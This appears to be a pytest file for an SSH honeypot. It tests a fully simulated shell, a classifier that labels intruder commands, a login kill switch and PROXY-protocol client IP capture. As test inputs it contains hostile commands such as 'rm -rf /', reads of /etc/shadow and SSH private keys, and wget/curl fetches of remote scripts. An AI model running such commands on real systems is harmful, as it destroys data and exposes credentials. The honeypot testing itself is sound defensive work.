import asyncio, asyncssh
from app.classifier import classify_command
from app.shell import FakeShell
from app import sshpot

OPT = dict(known_hosts=None, client_keys=None, agent_path=None)

def test_shell_is_fully_simulated():
    sh = FakeShell()
    assert "root:x:0:0" in sh.run("cat /etc/passwd")[0]
    assert sh.run("cd /etc && pwd")[0] == "/etc\n"
    assert sh.run("rm -rf /")[0] == "" and "/etc/passwd" in sh.files   # simulated: only the in-memory FS is touched
    assert "command not found" in sh.run("xyzzy")[0]
    assert "name resolution" in sh.run("curl http://203.0.113.9/x")[0]
    assert sh.run("exit")[1] is True
    assert "No such file" in sh.run("cat /proc/self/environ")[0]   # no real FS access

def test_command_classes():
    assert classify_command("uname -a") == "enumeration"
    assert classify_command("wget http://x/y.sh") == "exploitation_attempt"
    assert classify_command("cat /etc/shadow") == "privilege_escalation_attempt"
    assert classify_command("cat ~/.ssh/id_rsa") == "data_discovery_attempt"

def test_ssh_end_to_end():
    sshpot.reset_state(); events = []
    async def emit(e): events.append(e)
    async def main():
        srv = await sshpot.start_ssh(emit, lambda: True, host="127.0.0.1", port=0); port = srv.get_port()
        try:
            denied = 0
            for pw in ("123456", "admin"):
                try: await asyncssh.connect("127.0.0.1", port, username="root", password=pw, **OPT)
                except asyncssh.PermissionDenied: denied += 1
            assert denied == 2
            async with asyncssh.connect("127.0.0.1", port, username="root", password="toor", **OPT) as c:
                p = await c.create_process()
                p.stdin.write("uname -a\nwget http://203.0.113.9/x.sh\ncat /etc/passwd\nexit\n")
                out = await asyncio.wait_for(p.stdout.read(), 10)
                assert "Linux" in out and "root:x:0:0" in out
        finally:
            srv.close(); await srv.wait_closed()
    asyncio.run(main())
    assert [e["method"] for e in events][:3] == ["SSH-AUTH"] * 3
    assert [e["label"] for e in events if e["method"] == "SSH"][:3] == ["enumeration", "exploitation_attempt", "data_discovery_attempt"]
    assert len({e["session"] for e in events if e["method"] == "SSH"}) == 1

def test_killswitch_blocks_ssh_login():
    sshpot.reset_state()
    async def main():
        async def emit(e): pass
        srv = await sshpot.start_ssh(emit, lambda: False, host="127.0.0.1", port=0)
        try:
            for _ in range(4):
                try: await asyncssh.connect("127.0.0.1", srv.get_port(), username="root", password="toor", **OPT); return False
                except asyncssh.PermissionDenied: pass
            return True
        finally:
            srv.close(); await srv.wait_closed()
    assert asyncio.run(main())

def test_proxy_protocol_gives_real_client_ip():
    import socket
    sshpot.reset_state(); events = []
    async def emit(e): events.append(e)
    async def main():
        srv = await sshpot.start_ssh(emit, lambda: True, host="127.0.0.1", port=0, proxy_protocol=True)
        try:
            for pw in ("a", "b", "toor"):
                s = socket.create_connection(("127.0.0.1", srv.get_port()))
                s.sendall(b"PROXY TCP4 198.51.100.7 10.0.0.2 51000 2222\r\n")
                try:
                    async with asyncssh.connect(sock=s, username="root", password=pw, **OPT) as c:
                        p = await c.create_process(); p.stdin.write("whoami\nexit\n"); await asyncio.wait_for(p.stdout.read(), 10)
                except asyncssh.PermissionDenied: pass
        finally:
            srv.close(); await srv.wait_closed()
    asyncio.run(main())
    assert len(events) >= 4 and {e["ip"] for e in events} == {"198.51.100.7"}


def test_shell_noops_and_fake_fs_edits():
    sh = FakeShell()
    assert sh.run("chmod +x x.sh && mkdir /tmp/w && cd /tmp/w && touch a && ls")[0] == "a\n"
    assert sh.run("rm /tmp/w/a && ls /tmp/w")[0] == ""
    assert "command not found" not in sh.run("uptime")[0] and "up 41 days" in sh.run("uptime")[0]
